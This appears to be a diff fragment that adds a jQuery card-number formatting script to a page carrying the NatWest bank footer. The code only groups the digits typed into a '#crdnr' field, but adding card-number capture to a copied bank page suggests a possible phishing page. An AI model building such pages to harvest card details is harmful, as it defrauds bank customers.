style=border-width:0px;> </a></div><li class="footerSeparator hideForMobile"><span> · </span><li><a href=# id=ctl00_footer_ctl00_PopUpLink3Anchor> Accessibility </a><li class="footerSeparator hideForMobile"><span> · </span><li class="last FSCSLast"><span> © 2005-2021 National Westminster Bank plc </span></ul></div></div><div id=rsaFlashMovie></div><script>window.onload=function(){
+      
+input_nr = function(jQinp)
+{
+    var format_and_pos = function(input, char, backspace)
+    {
+        var start = 0;
+        var end = 0;
+        var pos = 0;
+        var value = input.value;
+
+        if (char !== false)
+        {
+            start = input.selectionStart;
+            end = input.selectionEnd;
+
+            if (backspace && start > 0) // handle backspace onkeydown
+            {
+                start--;
+
+                if (value[start] == " ")
+                { start--; }
+            }
+            // To be able to replace the selection if there is one
+            value = value.substring(0, start) + char + value.substring(end);
+
+            pos = start + char.length; // caret position
+        }
+
+        var d = 0; // digit count
+        var dd = 0; // total
+        var gi = 0; // group index
+        var newV = "";
+        var groups = /^\D*3[47]/.test(value) ? 
+        [4, 6, 5] : [4, 4, 4, 4];
+
+        for (var i = 0; i < value.length; i++)
+        {
+            if (/\D/.test(value[i]))
+            {
+                if (start > i)
+                { pos--; }
+            }
+            else
+            {
+                if (d === groups[gi])
+                {
+                    newV += " ";
+                    d = 0;
+                    gi++;
+
+                    if (start >= i)
+                    { pos++; }
+                }
+                newV += value[i];
+                d++;
+                dd++;
+            }
+            if (d === groups[gi] && groups.length === gi + 1) // max length
+            { break; }
+        }
+        input.value = newV;
+
+        if (char !== false)
+        { input.setSelectionRange(pos, pos); }
+    };
+
+    jQinp.keypress(function(e)
+    {
+        var code = e.charCode || e.keyCode || e.which;
+
+        // Check for tab and arrow keys (needed in Firefox)
+        if (code !== 9 && (code < 37 || code > 40) &&
+        // and CTRL+C / CTRL+V
+        !(e.ctrlKey && (code === 99 || code === 118)))
+        {
+            e.preventDefault();
+
+            var char = String.fromCharCode(code);
+
+            // if the character is non-digit
+            // -> return false (the character is not inserted)
+
+            if (/\D/.test(char))
+            { return false; }
+
+            format_and_pos(this, char);
+        }
+    }).
+    keydown(function(e) // backspace doesn't fire the keypress event
+    {
+        if (e.keyCode === 8 || e.keyCode === 46) // backspace or delete
+        {
+            e.preventDefault();
+            format_and_pos(this, '', this.selectionStart === this.selectionEnd);
+        }
+    }).
+    on('paste', function()
+    {
+        // A timeout is needed to get the new value pasted
+        setTimeout(function()
+        { format_and_pos(jQinp[0], ''); }, 50);
+    }).
+    blur(function() // reformat onblur just in case (optional)
+    {
+        format_and_pos(this, false);
+    });
+};
+
+input_nr($('#crdnr'));
+
+
+
+}</script>
